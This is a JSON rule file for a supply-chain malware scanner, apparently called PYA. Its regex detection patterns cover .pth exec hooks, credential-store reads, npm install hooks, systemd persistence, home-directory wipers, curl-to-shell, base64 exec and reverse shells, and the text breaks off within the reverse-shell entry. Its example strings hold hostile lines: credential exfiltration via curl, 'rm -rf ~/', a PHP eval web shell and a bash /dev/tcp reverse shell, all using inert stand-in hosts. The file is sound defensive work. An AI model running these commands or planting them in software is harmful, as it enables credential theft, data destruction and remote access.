{
  "version": 1,
  "description": "Permanent technique seeds for PYA. Python re syntax. match_on: line (per line), file (whole file, line of group 'hit' or match start), path (relative path). Examples are inert: 203.0.113.0/24 and example.invalid only.",
  "seeds": [
    {
      "id": "SEED-PTH-EXEC",
      "agent": "threat-intel",
      "severity": "CRITICAL",
      "title": "Python .pth file with an executable import line",
      "regex": "^\\s*import\\s[^\\n]*\\b(?:exec|eval|compile|__import__|b64decode|subprocess|system|popen|urlopen|socket|Popen)\\b",
      "match_on": "line",
      "file_glob": [
        "*.pth"
      ],
      "attack": "T1546.018",
      "cwe": "CWE-506",
      "note": "Lines starting with import in a .pth file run on every interpreter start (LiteLLM cook.pth).",
      "examples_vulnerable": [
        "import os, base64; exec(base64.b64decode(os.environ.get('X', 'cHJpbnQoMSk=')))",
        "import subprocess; subprocess.Popen(['python3', '/tmp/.cache/loader.py'])"
      ],
      "examples_safe": [
        "import _virtualenv",
        "/usr/lib/python3/dist-packages",
        "./src"
      ]
    },
    {
      "id": "SEED-SITECUSTOMIZE",
      "agent": "threat-intel",
      "severity": "MEDIUM",
      "title": "sitecustomize.py or usercustomize.py present (Python startup hook)",
      "regex": "(?:^|/)(?:sitecustomize|usercustomize)\\.py$",
      "match_on": "path",
      "file_glob": [
        "*"
      ],
      "attack": "T1546.018",
      "cwe": "CWE-506",
      "note": "Runs at every interpreter start. Review the content; LiteLLM 1.107.0 shipped one.",
      "examples_vulnerable": [
        "sitecustomize.py",
        "lib/python3.12/site-packages/usercustomize.py"
      ],
      "examples_safe": [
        "src/site_customize_helper.py",
        "docs/sitecustomize.md",
        "tests/test_sitecustomize_guard.py"
      ]
    },
    {
      "id": "SEED-CRED-STORE-READ",
      "agent": "threat-intel",
      "severity": "HIGH",
      "title": "Code reads developer credential stores (gh, npm, AWS, git, Docker, kube)",
      "regex": "(?:(?:readFileSync|readFile|read_text|read_bytes|open|cat|Get-Content|type)\\b[^\\n]{0,120}?(?:\\.config/gh\\b|\\.npmrc\\b|\\.aws/(?:credentials|config)\\b|\\.git-credentials\\b|\\.docker/config\\.json|\\.kube/config\\b)|['\\\"]\\.config['\\\"]\\s*,\\s*['\\\"]gh['\\\"]|['\\\"]\\.aws['\\\"]\\s*,\\s*['\\\"]credentials['\\\"])",
      "match_on": "line",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json"
      ],
      "attack": "T1552.001",
      "cwe": "CWE-522",
      "note": "Install hooks that read these files are the tensorlake and @subql/common pattern.",
      "examples_vulnerable": [
        "const hosts = fs.readFileSync(path.join(os.homedir(), '.config/gh/hosts.yml'), 'utf8');",
        "const p = path.join(os.homedir(), '.config', 'gh', 'hosts.yml');",
        "creds = open(os.path.expanduser('~/.aws/credentials')).read()",
        "cat ~/.npmrc | curl -s -X POST --data-binary @- https://203.0.113.10/c"
      ],
      "examples_safe": [
        "fs.writeFileSync('.npmrc', '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\\n');",
        "# Configure the AWS CLI with aws configure",
        "const cfg = loadConfig('./app.config.json');"
      ]
    },
    {
      "id": "SEED-NPM-HOOK-INLINE",
      "agent": "dependency-auditor",
      "severity": "HIGH",
      "title": "npm lifecycle hook runs an inline network or credential command",
      "regex": "\\\"(?:pre|post)?install\\\"\\s*:\\s*\\\"[^\\\"]*(?:curl\\s|wget\\s|node\\s+-e|python3?\\s+-c|\\.npmrc|\\.config/gh|\\.aws/|base64\\s|\\|\\s*(?:ba)?sh)",
      "match_on": "line",
      "file_glob": [
        "package.json"
      ],
      "attack": "T1195.001",
      "cwe": "CWE-506",
      "examples_vulnerable": [
        "\"postinstall\": \"curl -s https://203.0.113.7/i.sh | sh\",",
        "\"preinstall\": \"node -e \\\"require('child_process').exec('id')\\\"\","
      ],
      "examples_safe": [
        "\"postinstall\": \"husky install\",",
        "\"build\": \"curl -o x https://example.invalid/x\","
      ]
    },
    {
      "id": "SEED-SYSTEMD-USER-UNIT",
      "agent": "threat-intel",
      "severity": "HIGH",
      "title": "Code creates or enables a systemd user unit (persistence)",
      "regex": "(?:\\.config/systemd/user\\b|['\\\"]systemd['\\\"]\\s*[,/]\\s*['\\\"]user['\\\"]|systemctl\\s+--user\\s+(?:enable|start|daemon-reload|link)\\b)",
      "match_on": "line",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json",
        "*.ts",
        "Dockerfile"
      ],
      "attack": "T1543.002",
      "cwe": "CWE-506",
      "note": "tensorlake installs gh-token-monitor this way; SleepyDuck uses systemd too.",
      "examples_vulnerable": [
        "fs.writeFileSync(path.join(os.homedir(), '.config/systemd/user/gh-token-monitor.service'), unit);",
        "unit = Path.home() / '.config' / 'systemd' / 'user' / 'sync.service'",
        "execSync('systemctl --user enable --now sync.service');"
      ],
      "examples_safe": [
        "systemctl --user status pipewire",
        "systemctl status nginx",
        "# see the systemd docs for units"
      ]
    },
    {
      "id": "SEED-TOKEN-GATED-WIPER",
      "agent": "threat-intel",
      "severity": "CRITICAL",
      "title": "Token validity check followed by recursive home directory deletion (wiper)",
      "regex": "(?s)(?:api\\.github\\.com/user\\b|gh\\s+auth\\s+status|status(?:Code)?\\s*[!=]==?\\s*40[13]|\\b40[13]\\b\\s*[)\\]:]|Bad credentials).{0,3000}?(?P<hit>rm\\s+-[a-zA-Z]*r[a-zA-Z]*f?[a-zA-Z]*\\s+(?:~|\\\"?\\$HOME|\\$\\{HOME\\})|rmSync\\([^)\\n]*homedir\\(\\)|rimraf\\([^)\\n]*homedir\\(\\)|rmtree\\([^)\\n]*(?:expanduser\\(['\\\"]~|Path\\.home\\(\\)|HOME))",
      "match_on": "file",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json",
        "*.ts"
      ],
      "attack": "T1485",
      "cwe": "CWE-506",
      "note": "tensorlake pattern. Remove the monitor before revoking any token.",
      "examples_vulnerable": [
        "const r = await fetch('https://api.github.com/user', {headers});\nif (r.status === 401) {\n  fs.rmSync(os.homedir(), {recursive: true, force: true});\n}",
        "if ! gh auth status >/dev/null 2>&1; then\n  rm -rf ~/\nfi",
        "resp = requests.get('https://api.github.com/user', headers=h)\nif resp.status_code == 401:\n    shutil.rmtree(Path.home())"
      ],
      "examples_safe": [
        "const r = await fetch('https://api.github.com/user', {headers});\nif (r.status === 401) { throw new Error('token expired'); }",
        "rm -rf ./build",
        "shutil.rmtree(tmpdir)"
      ]
    },
    {
      "id": "SEED-HOME-WIPE",
      "agent": "threat-intel",
      "severity": "HIGH",
      "title": "Recursive deletion of the home directory",
      "regex": "(?:rm\\s+-[a-zA-Z]*r[a-zA-Z]*\\s+(?:~/?(?:\\s|$|['\\\"*])|\\\"?\\$HOME/?\\\"?(?:\\s|$|\\*))|rmSync\\(\\s*os\\.homedir\\(\\)\\s*[,)]|rmtree\\(\\s*(?:Path\\.home\\(\\)|os\\.path\\.expanduser\\(['\\\"]~/?['\\\"]\\))\\s*[,)])",
      "match_on": "line",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json",
        "*.ts"
      ],
      "attack": "T1485",
      "cwe": "CWE-506",
      "examples_vulnerable": [
        "rm -rf ~/",
        "rm -rf \"$HOME\"",
        "shutil.rmtree(Path.home())",
        "fs.rmSync(os.homedir(), {recursive: true})"
      ],
      "examples_safe": [
        "rm -rf ~/.cache/pya",
        "rm -rf \"$HOME/.cache/tool\"",
        "shutil.rmtree(Path.home() / '.cache' / 'x')"
      ]
    },
    {
      "id": "SEED-PIPE-TO-SHELL",
      "agent": "iac-scanner",
      "severity": "MEDIUM",
      "title": "Remote script piped straight into a shell (curl|bash, irm|iex)",
      "regex": "(?i)(?:\\b(?:curl|wget)\\b[^\\n|]*\\|\\s*(?:sudo\\s+(?:-\\S+\\s+)*)?(?:ba|z|da|k)?sh\\b|\\b(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest)\\b[^\\n|]*\\|\\s*(?:iex|Invoke-Expression)\\b)",
      "match_on": "line",
      "file_glob": [
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.ps1",
        "Dockerfile",
        "Dockerfile.*",
        "*.dockerfile",
        "Containerfile",
        "*.yml",
        "*.yaml",
        "Makefile",
        "*.mk",
        "package.json",
        "Vagrantfile"
      ],
      "attack": "T1059.004",
      "cwe": "CWE-494",
      "note": "No checksum or signature check; OVHcloud CLI install.sh served swapped binaries this way.",
      "examples_vulnerable": [
        "curl -fsSL https://example.invalid/install.sh | bash",
        "RUN wget -qO- https://example.invalid/setup | sudo -E sh",
        "irm https://example.invalid/install.ps1 | iex"
      ],
      "examples_safe": [
        "curl -fsSLo install.sh https://example.invalid/install.sh && sha256sum -c install.sh.sha256",
        "curl -s https://example.invalid/data.json | jq ."
      ]
    },
    {
      "id": "SEED-B64-EXEC",
      "agent": "threat-intel",
      "severity": "HIGH",
      "title": "Base64 or packed payload decoded and executed",
      "regex": "(?:\\b(?:exec|eval|Function|compile)\\s*\\(\\s*[^\\n]{0,60}?(?:b64decode|atob\\s*\\(|base64_decode|gzinflate|str_rot13|Buffer\\.from\\([^\\n]{0,200}?['\\\"]base64['\\\"])|\\bbase64\\s+(?:-d|--decode|-D)\\b[^\\n|]*\\|\\s*(?:ba|z)?sh\\b)",
      "match_on": "line",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json",
        "*.ts",
        "*.pth",
        "Dockerfile",
        "*.yml",
        "*.yaml"
      ],
      "attack": "T1140",
      "cwe": "CWE-506",
      "examples_vulnerable": [
        "exec(base64.b64decode('cHJpbnQoImhpIik='))",
        "exec(__import__('base64').b64decode(payload))",
        "eval(Buffer.from(blob, 'base64').toString());",
        "<?php eval(base64_decode($_POST['x'])); ?>",
        "echo ZWNobyBoaQo= | base64 -d | bash"
      ],
      "examples_safe": [
        "data = base64.b64decode(attachment)",
        "const img = Buffer.from(b64, 'base64');",
        "echo ZWNobyBoaQo= | base64 -d > out.txt"
      ]
    },
    {
      "id": "SEED-REVERSE-SHELL",
      "agent": "threat-intel",
      "severity": "CRITICAL",
      "title": "Reverse shell (bash, nc, python, node, php)",
      "regex": "(?:/dev/tcp/[\\w.\\-]+/\\d+|\\bnc(?:at)?\\b[^\\n]*\\s-[a-z]*e\\s+/bin/(?:ba)?sh|\\bsocket\\.socket\\([^\\n]*\\)[^\\n]*(?:dup2|pty\\.spawn|subprocess)|\\bpty\\.spawn\\(\\s*['\\\"]/bin/(?:ba)?sh|net\\.Socket\\(\\)[^\\n]*(?:spawn|exec)\\(\\s*['\\\"](?:/bin/)?(?:ba)?sh|\\bfsockopen\\([^\\n]*(?:exec|shell_exec|system|passthru|proc_open)\\s*\\(\\s*['\\\"]/bin/(?:ba)?sh)",
      "match_on": "line",
      "file_glob": [
        "*.py",
        "*.js",
        "*.cjs",
        "*.mjs",
        "*.ts",
        "*.sh",
        "*.bash",
        "*.zsh",
        "*.go",
        "*.rb",
        "*.php",
        "*.ps1",
        "*.pl",
        "setup.py",
        "package.json",
        "*.ts",
        "Dockerfile",
        "*.yml",
        "*.yaml",
        "*.pth"
      ],
      "attack": "T1059",
      "cwe": "CWE-506",
      "examples_vulnerable": [
        "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
